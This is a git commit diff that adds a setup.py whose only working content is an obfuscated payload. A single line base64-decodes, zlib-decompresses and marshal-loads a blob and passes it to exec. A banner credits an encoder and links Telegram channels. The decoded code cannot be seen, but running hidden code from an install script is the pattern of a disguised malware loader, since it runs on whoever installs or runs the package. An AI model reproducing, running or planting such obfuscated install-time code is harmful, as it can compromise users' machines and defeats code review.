ca4714cb157c5aac20030bc3d13c0fa9651aa6a6
120122vvd <12012200002@aluno.santamarcelina.edu.br>
2024-10-03 10:25:38 +0100

    Add files via upload

---
+++ setup.py
@@ -0,0 +1,11 @@
+# ENCODED BY : Kamal
+# ENCRYPTION : B64+ZLIB+MARSHAL
+# Telegram : https://t.me/Kamal939
+# Telegram Channel : https://t.me/BD71ZONE
+# ----------------------------------------------
+
+import base64, zlib, marshal
+
+# Your original script code starts here:
+# ----------------------------------------------
+exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJyVzkmOo1gUBdCUaharsBSDjNLPCjBgDCnVAAymNWAa08xoftB9egw2O6r11QYqQpkbqDs8uu/p/vvPH9++vYrGyRREYceHu587LW5i9PJldmi5iml8mvUkdxfOdmROB5Gu8ICnqZdXFyKYj3HzWSjmuZ9+Ytj83kCs/vrAkuzL61//Ky9l03fjvEviCdLUj10Tj1MRox+7DZXJC3zA9O03vaMuzqa3L3/PYNo1/Qin6e3X4XtCU1+YwbfkO1SfRp0SOlFzYUF8MMS8B9czohMRS55PBXmR0XWyo0pzWj+G/FFdQ/9is9lCKDge5wcIy6I/avJ1YNizN2KNS+JImq3l1hD9tt/PvOefhkDYLAvIiJYkPwa5u1S0CFgYLisXVVxxMnMsPlzz4xTjjmKHYmCX+aMEFKlQJx48GC6f3HRj8vrEcMEd+2CMbvmczY/s0vsDu+Z7XT6oAjWhMj1HU3xW/ODpb+k9hkJb3K7pR9M+sgGI6WELlaxF9zuxHpZorHrfqXBT04jOrsA6+LJ0qe07XFlRuUlUounGrGr3hSwwZZiMNdp7RTT1OUTXjrjiheQTtTYhzirRMWIdO35iBu8cr5vWA7KQemA2wDWDFsGjXdRaotYX0+/uPN3uz4zqVIaZHtSF1KlDZbe8ZNwydWCL7piU6JkOkeuPixF1tO5J/vks9qV5I0oM3dQMej5qBFsHqFz2wzo75ZMPoiQ5EBqgZhO3cDp6hPwh8AiVUBR3EevVcnFFJMdgeuZlxfnVUlCQOJMBTd7kMH3Efh2G8oYyfF2WJkoKgrcCZtxWR4PKGI1+RJ62j6xNKJxu170/ep00Gz3W9m7iEMwlmBvLtNlIZ4F8V1dhJcvz1BXCabteuHZPCyoGYINfOAosIWi0eRkbyhynkuzZrCWuwEOsdSkm7inrDL8K1t2qLPl2BpvEbMrUqWE02V4Y3xIvSTExIK1xdHQazfPU/f39z8/8B6/8MGI='))))
